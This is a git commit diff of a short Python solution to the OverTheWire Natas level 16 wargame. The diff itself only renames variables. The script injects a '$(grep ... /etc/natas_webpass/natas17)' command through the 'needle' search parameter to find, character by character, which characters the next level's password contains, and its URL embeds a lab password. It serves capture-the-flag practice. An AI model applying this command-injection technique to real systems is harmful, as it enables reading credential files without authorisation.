d540026133e761790d290ebb2e66970fdc0e16ca
babaAH <31179945+babaAH@users.noreply.github.com>
2018-12-07 23:54:28 +0300

    natas 16 write up

--- natas16.py
+++ natas16.py
@@ -1,17 +1,17 @@
 import requests
 
 URL = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'
-ss = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 s = requests.Session()
-a = ''
+answer = ''
 
-for ch in ss:
+for ch in alphabet:
    #data = {'needle':'bluffed$(grep "'+ch+'" /etc/natas_webpass/natas17'}
    #r = s.post(URL, data=data)
    r = s.get(URL+'?needle=bluffed%24%28grep+'+ch+'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search')
    if 'bluffed' in r.text:
        c = 1
    else:
-       a = a+ch
+       answer = answer+ch
 
-print(a)
+print(answer)
